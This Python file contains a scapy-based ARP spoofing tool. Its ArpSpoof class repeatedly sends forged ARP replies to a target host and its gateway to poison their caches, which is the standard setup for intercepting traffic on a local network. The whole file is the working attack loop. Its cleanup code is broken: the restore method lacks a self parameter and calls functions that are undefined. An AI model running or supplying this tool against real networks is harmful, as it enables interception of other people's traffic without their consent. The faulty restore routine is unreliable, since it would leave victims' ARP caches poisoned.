import scapy.all as scapy
import time


class ArpSpoof:
    def __init__(self, targetIp, gatewayIp):
        self.targetIp = targetIp
        self.gatewayIp = gatewayIp
        self.ARP = scapy.ARP()
        self.Ether = scapy.Ether()
        self.sentPacketCount = 0

    def spoofArp(self, targetIP, spoofIP):
        forged_packet = scapy.ARP(op=2, pdst=targetIP, hwdst=self.getMacAddr(targetIP), psrc=spoofIP)
        scapy.send(forged_packet, verbose=False)

    def getMacAddr(self, ip, broadcastDestination="ff:ff:ff:ff:ff:ff", timeout=5):
        self.Ether.dst = broadcastDestination
        self.ARP.pdst = ip
        request_broadcast = self.Ether / self.ARP
        clients = scapy.srp(request_broadcast, timeout=1, verbose=False)[0]
        return clients[0][1].hwsrc

    def restore_mac_addr(destinationIP, sourceIP):
        destinationMacAddr = getMacAddr(destinationIP)
        sourceMac = getMacAddr(sourceIP)
        request_arp = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMacAddr, psrc=sourceIP, hwsrc=sourceMac)
        scapy.send(request_arp, verbose=False)

    def execute(self):
        try:
            while True:
                self.spoofArp(self.targetIp, self.gatewayIp)
                self.spoofArp(self.gatewayIp, self.targetIp)
                self.sentPacketCount = self.sentPacketCount + 2
                print("Packet sent " + str(self.sentPacketCount))
                time.sleep(5)

        except KeyboardInterrupt:
            print("\nCtrl + C pressed.............Exiting")
            self.restore_mac_addr(self.gatewayIp, self.targetIp)
            self.restore(self.targetIp, self.gatewayIp)
            print("[+] Arp Spoof Stopped")
